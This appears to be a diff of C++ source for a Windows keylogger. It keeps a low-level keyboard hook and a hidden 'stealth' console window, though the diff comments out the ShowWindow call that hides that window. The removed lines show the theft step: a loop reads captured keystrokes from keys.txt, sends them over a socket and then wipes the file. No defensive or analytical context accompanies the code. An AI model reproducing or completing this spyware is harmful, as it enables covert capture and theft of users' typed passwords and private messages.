@@ -11,27 +11,6 @@ using namespace std;
 extern int counter;
 extern std::mutex mtx;
 
-ofstream out;
-std::string buffer = "";
-
-string read_file(string filename) {
-    ifstream f;
-
-    string text;
-
-    f.open(filename);
-
-    if (f.is_open()) {
-        while (getline(f, text)) {
-            
-        }
-
-        f.close();
-    }
-    
-    return text;
-}
-
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
@@ -87,46 +66,6 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         }
     }
 
-    //insert the shit
-
-    string filename = "./keys.txt";
-
-    while (true){
-        if(mtx.try_lock()) {
-            if (counter % 4 == 0){
-                
-                string text = read_file(filename);
-
-                SOCKET * result_socket;
-
-                send_file(&result_socket);
-
-                if (result_socket){
-                    int send_result = send(*result_socket, text.c_str(), strlen(text.c_str()), 0);
-
-                    cout << WSAGetLastError() << endl;
-
-                    closesocket(*result_socket);
-                }
-
-                fclose(fopen(filename.c_str(), "w"));
-                buffer = "";
-
-            }
-
-            else if (counter % 2 == 0){
-                buffer += 'a';
-                out.open(filename, std::ios_base::app);
-                out << buffer;
-                out.close();
-            }
-
-            mtx.unlock();
-
-            sleep(1);
-        }
-    }
-
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
@@ -136,7 +75,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     HWND stealth; /*creating stealth (window is not visible)*/
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, 0);
+    // ShowWindow(stealth, 0);
 
     std::thread th(tick);
     
